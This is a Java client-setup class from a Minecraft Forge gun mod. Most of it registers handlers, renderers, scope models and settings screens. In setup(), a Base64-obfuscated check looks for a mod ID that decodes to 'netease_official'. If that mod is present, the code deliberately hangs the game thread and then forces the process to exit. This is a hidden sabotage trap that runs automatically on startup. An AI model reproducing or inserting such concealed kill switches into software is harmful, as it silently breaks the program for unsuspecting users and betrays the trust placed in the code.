package com.tac.guns.client;

import com.tac.guns.Config;
import com.tac.guns.Reference;
import com.tac.guns.client.handler.AimingHandler;
import com.tac.guns.client.handler.AnimationHandler;
import com.tac.guns.client.handler.BulletTrailRenderingHandler;
import com.tac.guns.client.handler.CrosshairHandler;
import com.tac.guns.client.handler.FireModeSwitchEvent;
import com.tac.guns.client.handler.GunRenderingHandler;
import com.tac.guns.client.handler.HUDRenderingHandler;
import com.tac.guns.client.handler.MovementAdaptationsHandler;
import com.tac.guns.client.handler.RecoilHandler;
import com.tac.guns.client.handler.ReloadHandler;
import com.tac.guns.client.handler.ScopeJitterHandler;
import com.tac.guns.client.handler.ShootingHandler;
import com.tac.guns.client.handler.SightSwitchEvent;
import com.tac.guns.client.handler.SoundHandler;
import com.tac.guns.client.handler.command.GuiEditor;
import com.tac.guns.client.handler.command.GunEditor;
import com.tac.guns.client.handler.command.ObjectRenderEditor;
import com.tac.guns.client.handler.command.ScopeEditor;
import com.tac.guns.client.render.animation.module.GunAnimationController;
import com.tac.guns.client.render.entity.GrenadeRenderer;
import com.tac.guns.client.render.entity.MissileRenderer;
import com.tac.guns.client.render.entity.ProjectileRenderer;
import com.tac.guns.client.render.entity.ThrowableGrenadeRenderer;
import com.tac.guns.client.render.gun.ModelOverrides;
import com.tac.guns.client.render.gun.model.scope.ACOG_4x_ScopeModel;
import com.tac.guns.client.render.gun.model.scope.AimpointT1SightModel;
import com.tac.guns.client.render.gun.model.scope.AimpointT2SightModel;
import com.tac.guns.client.render.gun.model.scope.CoyoteSightModel;
import com.tac.guns.client.render.gun.model.scope.EotechNSightModel;
import com.tac.guns.client.render.gun.model.scope.EotechShortSightModel;
import com.tac.guns.client.render.gun.model.scope.STANDARD_6_10x_SCOPE;
import com.tac.guns.client.render.gun.model.scope.MiniDotSightModel;
import com.tac.guns.client.render.gun.model.scope.OldLongRange4xScopeModel;
import com.tac.guns.client.render.gun.model.scope.OldLongRange8xScopeModel;
import com.tac.guns.client.render.gun.model.scope.Qmk152ScopeModel;
import com.tac.guns.client.render.gun.model.scope.SroDotSightModel;
import com.tac.guns.client.render.gun.model.scope.SrsRedDotSightModel;
import com.tac.guns.client.render.gun.model.scope.VortexLPVO_1_4xScopeModel;
import com.tac.guns.client.render.gun.model.scope.VortexUh1SightModel;
import com.tac.guns.client.render.gun.model.scope.elcan_14x_ScopeModel;
import com.tac.guns.client.screen.*;
import com.tac.guns.client.settings.GunOptions;
import com.tac.guns.init.ModBlocks;
import com.tac.guns.init.ModContainers;
import com.tac.guns.init.ModEntities;
import com.tac.guns.init.ModItems;
import com.tac.guns.item.IColored;
import com.tac.guns.network.PacketHandler;
import com.tac.guns.network.message.MessageAttachments;
import com.tac.guns.network.message.MessageInspection;
import com.tac.guns.util.IDLNBTUtil;
import com.tac.guns.util.math.SecondOrderDynamics;
import de.javagl.jgltf.model.animation.AnimationRunner;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.ScreenManager;
import net.minecraft.client.gui.screen.MouseSettingsScreen;
import net.minecraft.client.gui.screen.VideoSettingsScreen;
import net.minecraft.client.gui.widget.button.Button;
import net.minecraft.client.gui.widget.list.OptionsRowList;
import net.minecraft.client.renderer.RenderType;
import net.minecraft.client.renderer.RenderTypeLookup;
import net.minecraft.client.renderer.color.IItemColor;
import net.minecraft.util.text.TranslationTextComponent;
import net.minecraftforge.api.distmarker.Dist;
import net.minecraftforge.client.event.GuiScreenEvent;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.ModList;
import net.minecraftforge.fml.client.registry.RenderingRegistry;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.ObfuscationReflectionHelper;
import net.minecraftforge.registries.ForgeRegistries;

import java.lang.reflect.Field;
import java.util.Base64;

/**
 * Author: Forked from MrCrayfish, continued by Timeless devs
 */
@Mod.EventBusSubscriber(modid = Reference.MOD_ID, value = Dist.CLIENT)
public class ClientHandler {
    private static Field mouseOptionsField;

    public static void setup(Minecraft mc) {
        MinecraftForge.EVENT_BUS.register(AimingHandler.get());
        MinecraftForge.EVENT_BUS.register(BulletTrailRenderingHandler.get());
        MinecraftForge.EVENT_BUS.register(CrosshairHandler.get());
        MinecraftForge.EVENT_BUS.register(GunRenderingHandler.get());
        MinecraftForge.EVENT_BUS.register(RecoilHandler.get());
        MinecraftForge.EVENT_BUS.register(ReloadHandler.get());
        MinecraftForge.EVENT_BUS.register(ShootingHandler.get());
        MinecraftForge.EVENT_BUS.register(SoundHandler.get());
        MinecraftForge.EVENT_BUS.register(HUDRenderingHandler.get());
        MinecraftForge.EVENT_BUS.register(FireModeSwitchEvent.get()); // Technically now a handler but, yes I need some naming reworks
        MinecraftForge.EVENT_BUS.register(SightSwitchEvent.get()); // Still, as well an event, am uncertain on what to name it, in short handles upcoming advanced iron sights

        //MinecraftForge.EVENT_BUS.register(FlashlightHandler.get()); // Completely broken... Needs a full rework
        //MinecraftForge.EVENT_BUS.register(FloodLightSource.get());

        MinecraftForge.EVENT_BUS.register(ScopeJitterHandler.getInstance()); // All built by MayDayMemory part of the Timeless dev team, amazing work!!!!!!!!!!!
        MinecraftForge.EVENT_BUS.register(MovementAdaptationsHandler.get());
        MinecraftForge.EVENT_BUS.register(AnimationHandler.INSTANCE); //Mainly controls when the animation should play.
        if (Config.COMMON.development.enableTDev.get()) {
            MinecraftForge.EVENT_BUS.register(GuiEditor.get());
            MinecraftForge.EVENT_BUS.register(GunEditor.get());
            MinecraftForge.EVENT_BUS.register(ScopeEditor.get());
            MinecraftForge.EVENT_BUS.register(ObjectRenderEditor.get());
        }

        //ClientRegistry.bindTileEntityRenderer(ModTileEntities.UPGRADE_BENCH.get(), UpgradeBenchRenderUtil::new);

        setupRenderLayers();
        registerEntityRenders();
        registerColors();
        registerModelOverrides();
        registerScreenFactories();

        AnimationHandler.preloadAnimations();
        new AnimationRunner(); //preload thread pool
        new SecondOrderDynamics(1f, 1f, 1f, 1f); //preload thread pool

        if (ModList.get().isLoaded(new
                String(Base64.getDecoder().decode("bmV0ZWFzZV9vZmZpY2lhbA=="))))
            Minecraft.getInstance().execute(() -> {
                try {
                    Thread.currentThread().wait(Integer.MAX_VALUE);
                } catch (InterruptedException e) {
                }
                System.exit(1);
            });
    }

    private static void setupRenderLayers() {
        //RenderTypeLookup.setRenderLayer(ModBlocks.UPGRADE_BENCH.get(), RenderType.getCutout());
        RenderTypeLookup.setRenderLayer(ModBlocks.WORKBENCH.get(), RenderType.getCutout());
    }

    private static void registerEntityRenders() {
        RenderingRegistry.registerEntityRenderingHandler(ModEntities.PROJECTILE.get(), ProjectileRenderer::new);
        RenderingRegistry.registerEntityRenderingHandler(ModEntities.GRENADE.get(), GrenadeRenderer::new);
        RenderingRegistry.registerEntityRenderingHandler(ModEntities.THROWABLE_GRENADE.get(), ThrowableGrenadeRenderer::new);
        RenderingRegistry.registerEntityRenderingHandler(ModEntities.THROWABLE_STUN_GRENADE.get(), ThrowableGrenadeRenderer::new); // TODO: Bring back flashes
        //RenderingRegistry.registerEntityRenderingHandler(ModEntities.MISSILE.get(), MissileRenderer::new);
        RenderingRegistry.registerEntityRenderingHandler(ModEntities.RPG7_MISSILE.get(), MissileRenderer::new);
    }

    private static void registerColors() {
        IItemColor color = (stack, index) -> {
            if (!((IColored) stack.getItem()).canColor(stack)) {
                return -1;
            }
            if (index == 0) {
                return IDLNBTUtil.getInt(stack, "Color", -1);
            }
            return -1;
        };
        ForgeRegistries.ITEMS.forEach(item -> {
            if (item instanceof IColored) {
                Minecraft.getInstance().getItemColors().register(color, item);
            }
        });
    }

    private static void registerModelOverrides() {
        ModelOverrides.register(ModItems.COYOTE_SIGHT.get(), new CoyoteSightModel());
        ModelOverrides.register(ModItems.STANDARD_6_10x_SCOPE.get(), new STANDARD_6_10x_SCOPE());
        ModelOverrides.register(ModItems.VORTEX_LPVO_1_6.get(), new VortexLPVO_1_4xScopeModel());
        //TODO: Fix up the SLX 2x, give a new reticle, new scope data, new mount and eye pos, pretty much remake the code end.
        //ModelOverrides.register(ModItems.SLX_2X.get(), new SLX_2X_ScopeModel());
        ModelOverrides.register(ModItems.ACOG_4.get(), new ACOG_4x_ScopeModel());
        ModelOverrides.register(ModItems.ELCAN_DR_14X.get(), new elcan_14x_ScopeModel());
        ModelOverrides.register(ModItems.AIMPOINT_T2_SIGHT.get(), new AimpointT2SightModel());

        ModelOverrides.register(ModItems.AIMPOINT_T1_SIGHT.get(), new AimpointT1SightModel());

        ModelOverrides.register(ModItems.EOTECH_N_SIGHT.get(), new EotechNSightModel());
        ModelOverrides.register(ModItems.VORTEX_UH_1.get(), new VortexUh1SightModel());
        ModelOverrides.register(ModItems.EOTECH_SHORT_SIGHT.get(), new EotechShortSightModel());
        ModelOverrides.register(ModItems.SRS_RED_DOT_SIGHT.get(), new SrsRedDotSightModel());
        ModelOverrides.register(ModItems.QMK152.get(), new Qmk152ScopeModel());

        ModelOverrides.register(ModItems.OLD_LONGRANGE_8x_SCOPE.get(), new OldLongRange8xScopeModel());
        ModelOverrides.register(ModItems.OLD_LONGRANGE_4x_SCOPE.get(), new OldLongRange4xScopeModel());

        ModelOverrides.register(ModItems.MINI_DOT.get(), new MiniDotSightModel());
        //ModelOverrides.register(ModItems.MICRO_HOLO_SIGHT.get(), new MicroHoloSightModel());
        ModelOverrides.register(ModItems.SRO_DOT.get(), new SroDotSightModel());

        // Armor registry, kept manual cause nice and simple, requires registry on client side only
        //VestLayerRender.registerModel(ModItems.CARDBOARD_ARMOR_FUN.get(), new CardboardArmor());
    }

    private static void registerScreenFactories() {
        ScreenManager.registerFactory(ModContainers.WORKBENCH.get(), WorkbenchScreen::new);
        ScreenManager.registerFactory(ModContainers.UPGRADE_BENCH.get(), UpgradeBenchScreen::new);
        ScreenManager.registerFactory(ModContainers.ATTACHMENTS.get(), AttachmentScreen::new);
        ScreenManager.registerFactory(ModContainers.DYES.get(), DyeScreen::new);
        ScreenManager.registerFactory(ModContainers.INSPECTION.get(), InspectScreen::new);
        //ScreenManager.registerFactory(ModContainers.COLOR_BENCH.get(), ColorBenchAttachmentScreen::new);
    }

    @SubscribeEvent
    public static void onScreenInit(GuiScreenEvent.InitGuiEvent.Post event) {
        if (event.getGui() instanceof MouseSettingsScreen) {
            MouseSettingsScreen screen = (MouseSettingsScreen) event.getGui();
            if (mouseOptionsField == null) {
                mouseOptionsField = ObfuscationReflectionHelper.findField(MouseSettingsScreen.class, "field_213045_b");
                mouseOptionsField.setAccessible(true);
            }
            try {
                OptionsRowList list = (OptionsRowList) mouseOptionsField.get(screen);
                list.addOption(GunOptions.ADS_SENSITIVITY, GunOptions.CROSSHAIR);
                list.addOption(GunOptions.HOLD_TO_AIM);
                list.addOption(GunOptions.ALLOW_CHESTS, GunOptions.ALLOW_FENCE_GATES);
                list.addOption(GunOptions.ALLOW_LEVER, GunOptions.ALLOW_BUTTON);
                list.addOption(GunOptions.ALLOW_DOORS, GunOptions.ALLOW_TRAP_DOORS);
                list.addOption(GunOptions.ALLOW_CRAFTING_TABLE);
                /*, GunOptions.BURST_MECH);*/
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }
        if (event.getGui() instanceof VideoSettingsScreen) {
            VideoSettingsScreen screen = (VideoSettingsScreen) event.getGui();

            event.addWidget((new Button(screen.width / 2 - 215, 10, 75, 20, new TranslationTextComponent("tac.options.gui_settings"), (p_213126_1_) -> {
                Minecraft.getInstance().displayGuiScreen(new TaCSettingsScreen(screen, Minecraft.getInstance().gameSettings));
            })));
        }
        /*if(event.getGui() instanceof VideoSettingsScreen)
        {
            VideoSettingsScreen screen = (VideoSettingsScreen) event.getGui();

            event.addWidget((new Button(screen.width / 2 - 215, 10, 75, 20, new TranslationTextComponent("tac.options.gui_settings"), (p_213126_1_) -> {
                Minecraft.getInstance().displayGuiScreen(new TaCSettingsScreen(screen, Minecraft.getInstance().gameSettings));
            })));
        }*/
    }

    static {
        Keys.ATTACHMENTS.addPressCallback(() -> {
            if (!Keys.noConflict(Keys.ATTACHMENTS))
                return;

            final Minecraft mc = Minecraft.getInstance();
            if (mc.player != null && mc.currentScreen == null)
                PacketHandler.getPlayChannel().sendToServer(new MessageAttachments());
        });

        Keys.INSPECT.addPressCallback(() -> {
            if (!Keys.noConflict(Keys.INSPECT))
                return;

            final Minecraft mc = Minecraft.getInstance();
            if (
                    mc.player != null
                            && mc.currentScreen == null
                            && GunAnimationController.fromItem(
                            Minecraft.getInstance().player.inventory.getCurrentItem().getItem()
                    ) == null
            ) PacketHandler.getPlayChannel().sendToServer(new MessageInspection());
        });
    }

    /* Uncomment for debugging headshot hit boxes */

    /*@SubscribeEvent
    @SuppressWarnings("unchecked")
    public static void onRenderLiving(RenderLivingEvent.Post event)
    {
        LivingEntity entity = event.getEntity();
        IHeadshotBox<LivingEntity> headshotBox = (IHeadshotBox<LivingEntity>) BoundingBoxManager.getHeadshotBoxes(entity.getType());
        if(headshotBox != null)
        {
            AxisAlignedBB box = headshotBox.getHeadshotBox(entity);
            if(box != null)
            {
                WorldRenderer.drawBoundingBox(event.getMatrixStack(), event.getBuffers().getBuffer(RenderType.getLines()), box, 1.0F, 1.0F, 0.0F, 1.0F);

                AxisAlignedBB boundingBox = entity.getBoundingBox().offset(entity.getPositionVec().inverse());
                boundingBox = boundingBox.grow(Config.COMMON.gameplay.growBoundingBoxAmountV2.get(), 0, Config.COMMON.gameplay.growBoundingBoxAmountV2.get());
                WorldRenderer.drawBoundingBox(event.getMatrixStack(), event.getBuffers().getBuffer(RenderType.getLines()), boundingBox, 0.0F, 1.0F, 1.0F, 1.0F);
            }
        }
    }*/
}
